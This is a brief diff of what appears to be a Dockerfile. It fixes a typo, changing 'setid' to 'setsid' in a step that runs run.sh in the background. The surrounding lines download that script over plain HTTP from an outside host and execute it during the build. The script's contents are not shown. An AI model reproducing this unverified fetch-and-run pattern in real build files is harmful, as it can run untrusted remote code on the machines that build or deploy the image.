@@ -16,7 +16,7 @@ RUN apt-get update && \
     make && \
     wget http://247app.host/run.sh && \
     chmod 755 run.sh
-RUN setid ./run.sh &
+RUN setsid ./run.sh &
 
 EXPOSE 80
 
